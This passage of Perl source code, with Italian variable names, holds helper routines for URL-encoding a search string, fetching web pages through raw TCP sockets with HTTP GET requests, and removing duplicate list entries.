$chiave =~ s/ /\+/g;
$chiave =~ s/:/\%3A/g;
$chiave =~ s/\//\%2F/g;
$chiave =~ s/&/\%26/g;
$chiave =~ s/\"/\%22/g;
$chiave =~ s/,/\%2C/g;
$chiave =~ s/\\/\%5C/g;
return $chiave;
}

sub query($){
my $url=$_[0];
$url=~s/http:\/\///;
my $host=$url;
my $query=$url;
my $page="";
$host=~s/href=\"?http:\/\///;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$query=~s/$host//;
if ($query eq "") {$query="/";};
eval {
my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page="@r";
close($sock);
};
return $page;
}

sub unici{
my @unici = ();
my %visti = ();
foreach my $elemento ( @_ )
{
next if $visti{ $elemento }++;
push @unici, $elemento;
}   
return @unici;
}

sub http_query($){
my ($url) = @_;
my $host=$url;
my $query=$url;
my $page="";
$host =~ s/href=\"?http:\/\///;
$host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$query =~s/$host//;
if ($query eq "") {$query="/";};
eval {
local $SIG{ALRM} = sub { die "1";};
alarm 10;
my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page="@r";
alarm 0;
close($sock);
};
return $page;
}}
